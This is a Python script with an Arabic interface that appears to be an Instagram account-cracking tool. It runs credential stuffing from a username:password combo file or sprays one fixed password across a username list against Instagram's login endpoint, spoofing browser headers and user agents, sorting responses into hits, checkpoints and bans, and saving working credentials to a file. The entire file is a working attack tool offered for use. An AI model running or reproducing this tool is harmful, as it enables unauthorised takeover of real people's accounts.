import requests
from user_agent import generate_user_agent
from datetime import datetime
from time import sleep
from os import system
from sys import exit

Z = '\033[1;31m' #احمر
S = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
system('clear')

def jj_8t():
	system('clear')
	# كوبو #	
	url = "https://www.instagram.com/accounts/login/ajax/"
	headers = {
		'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'content-length': '321',
		'content-type': 'application/x-www-form-urlencoded',
		'cookie': 'csrftoken=9uC0IZCNzChRNbCvqXi03BzUnvHQdNr5; mid=YoL7_gAEAAHVcHllgsPy5EzKIkG1; ig_did=1A60B050-D93A-48AA-9DF0-023F8DBD196B; ig_nrcb=1',
		'origin': 'https://www.instagram.com',
		'referer': 'https://www.instagram.com/',
		'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': generate_user_agent(),
		'x-asbd-id': '198387',
		'x-csrftoken': '9uC0IZCNzChRNbCvqXi03BzUnvHQdNr5',
		'x-ig-app-id': '936619743392459',
		'x-ig-www-claim': '0',
		'x-instagram-ajax': '9bcc5b5208c5',
		'x-requested-with': 'XMLHttpRequest',
	}
	print('\n\033[1;97m[\033[1;92m•\033[1;97m] ادخل اسم ملف الكومبو \033[1;97m[\033[1;92m•\033[1;97m]')
	
	co = input('‏​‏\n‏​‏\033[1;97m[\033[1;92m>\033[1;97m]\033[1;92m ')
	for o in open(co, 'r').read().splitlines():
		username,password = o.split(':')
		timee = int(datetime.now().timestamp())
		data = {
			'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timee}:{password}',
			'username': username,
			'queryParams': '{}',
			'optIntoOneTap': 'false',
			'stopDeletionNonce': '',
			'trustedDeviceRecords': '{}',
		}
		r = requests.post(url, headers=headers,data=data)
		
		if 'oneTapPrompt":true' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[2;32m+\033[1;97m] تم تسجيل الدخول [\033[2;32m+\033[1;97m]\n\033[1;97m[ '+C+username+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[2;32mاسم المستخدم\n\033[1;97m[ '+C+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[2;32mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
			open('Password_found.txt', 'a').write('username : '+username+'\n'+'password : '+password+'\n\n')
	
		elif '{"message":"checkpoint_required","checkpoint_url":"/challenge/action/' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[2;32m+\033[1;97m] الحساب يطلب تحقق [\033[2;32m+\033[1;97m]\n\033[1;97m[ '+C+username+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[2;32mاسم المستخدم\n\033[1;97m[ '+C+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[2;32mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
			open('Password_found.txt', 'a').write('username : '+username+'\n'+'password : '+password+'\n\n')

		elif 'user":true,"authenticated":false,"status":"ok' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mلم يتم تسجيل الدخول \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+username+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
	
		elif 'errors":{"error":["Sorry, there was a problem with your request."]},"status":"ok","error_type":"generic_request_error"}' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mلم يتم تسجيل الدخول \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+username+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
	
		elif '{"user":false,"authenticated":false,"status":"ok"}' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mلم يتم تسجيل الدخول \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+username+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
			
		elif '{"message":"To secure your account, we' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mلم يتم تسجيل الدخول \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+username+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
	
		elif 'message":"","status":"fail"' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mحظر \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+username+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
	
		else:
			print(r.text)

def rr__8():
	system('clear')
	# باسورد ثابت	 #	
	url = "https://www.instagram.com/accounts/login/ajax/"
	headers = {
		'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'content-length': '321',
		'content-type': 'application/x-www-form-urlencoded',
		'cookie': 'csrftoken=9uC0IZCNzChRNbCvqXi03BzUnvHQdNr5; mid=YoL7_gAEAAHVcHllgsPy5EzKIkG1; ig_did=1A60B050-D93A-48AA-9DF0-023F8DBD196B; ig_nrcb=1',
		'origin': 'https://www.instagram.com',
		'referer': 'https://www.instagram.com/',
		'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': generate_user_agent(),
		'x-asbd-id': '198387',
		'x-csrftoken': '9uC0IZCNzChRNbCvqXi03BzUnvHQdNr5',
		'x-ig-app-id': '936619743392459',
		'x-ig-www-claim': '0',
		'x-instagram-ajax': '9bcc5b5208c5',
		'x-requested-with': 'XMLHttpRequest',
	}
	
	print('\n\033[1;97m[\033[1;92m•\033[1;97m] ادخل اسم ملف اليوزرات \033[1;97m[\033[1;92m•\033[1;97m]')
	
	username = input('‏​‏\n‏​‏\033[1;97m[\033[1;92m>\033[1;97m]\033[1;92m ')
	system('clear')
	print('\n\033[1;97m[\033[1;92m•\033[1;97m] ادخل الباسورد الثابت \033[1;97m[\033[1;92m•\033[1;97m]')
	
	password = input('‏​‏\n‏​‏\033[1;97m[\033[1;92m>\033[1;97m]\033[1;92m ')
	
	for o in open(username, 'r').read().splitlines():
		timee = int(datetime.now().timestamp())
		data = {
			'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timee}:{password}',
			'username': o,
			'queryParams': '{}',
			'optIntoOneTap': 'false',
			'stopDeletionNonce': '',
			'trustedDeviceRecords': '{}',
		}
		r = requests.post(url, headers=headers,data=data)
		
		if 'oneTapPrompt":true' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[2;32m+\033[1;97m] تم تسجيل الدخول [\033[2;32m+\033[1;97m]\n\033[1;97m[ '+C+o+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[2;32mاسم المستخدم\n\033[1;97m[ '+C+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[2;32mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
			open('Password_found.txt', 'a').write('username : '+o+'\n'+'password : '+password+'\n\n')
	
		elif '{"message":"checkpoint_required","checkpoint_url":"/challenge/action/' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[2;32m+\033[1;97m] الحساب يطلب تحقق [\033[2;32m+\033[1;97m]\n\033[1;97m[ '+C+o+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[2;32mاسم المستخدم\n\033[1;97m[ '+C+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[2;32mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
			open('Password_found.txt', 'a').write('username : '+o+'\n'+'password : '+password+'\n\n')
	
		elif 'user":true,"authenticated":false,"status":"ok' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mلم يتم تسجيل الدخول \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+o+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
	
		elif 'errors":{"error":["Sorry, there was a problem with your request."]},"status":"ok","error_type":"generic_request_error"}' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mلم يتم تسجيل الدخول \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+o+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
	
		elif '{"user":false,"authenticated":false,"status":"ok"}' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mلم يتم تسجيل الدخول \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+o+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
			
		elif '{"message":"To secure your account, we' in r.text:
			print(S+'\nــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mلم يتم تسجيل الدخول \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+o+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'\nــــــــــــــــــــــــــــــ')
	
		elif 'message":"","status":"fail"' in r.text:
			print(S+'ــــــــــــــــــــــــــــــ')
			print('\033[1;97m[\033[1;31m-\033[1;97m] \033[1;97mحظر \033[1;97m[\033[1;31m-\033[1;97m]\033[1;31m\n\033[1;97m[ '+Y+o+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m:\033[1;31m اسم المستخدم\n\033[1;97m[ '+Y+password+'\033[1;97m ]\033[1;97m \033[1;33m<== \033[1;97m: \033[1;31mكلمة المرور')
			print(S+'ــــــــــــــــــــــــــــــ')
	
		else:
			print(r.text)

print(Z+'  .oooo.')
print(F+" d8P'`Y8b")
print(Z+'888    888 oooo d8b')
print(F+'888    888 `888""8P')
print(Z+'888    888  888')
print(F+"`88b  d88'  888")
print(Z+" `Y8bd8P'  d888b")
print(Z+'+----------------+')
print('\033[1;31m|\033[2;32m تخمين انستقرام \033[1;31m|')
print(Z+'+----------------+')
print('\033[1;33minsta'+'\033[1;31m :\033[2;36m jj_8t')
print(F+'ـــــــــــــــــــــــ')
				
print('\033[1;31m['+S+'1'+'\033[1;31m]\033[2;32m ==>\033[1;31m [\033[2;36m كوبو عشوائي\033[1;31m ]')

print('\033[1;31m['+S+'2'+'\033[1;31m]\033[2;32m ==>\033[1;31m [\033[2;36m باسورد ثابت\033[1;31m ]')
print(F+'ـــــــــــــــــــــــ')
print('\n\033[1;97m[\033[1;92m•\033[1;97m] يرجا الاختيار \033[1;97m[\033[1;92m•\033[1;97m]')
JJ = input('‏​‏\n‏​‏\033[1;97m[\033[1;92m>\033[1;97m]\033[1;92m ')

if JJ == '1':
	jj_8t()
elif JJ == '2':
	rr__8()
else:
	print('\n\033[1;97m[ '+Z+JJ+'\033[1;97m ]\033[1;31m لايوجد خيار هكذا\n')
	exit()

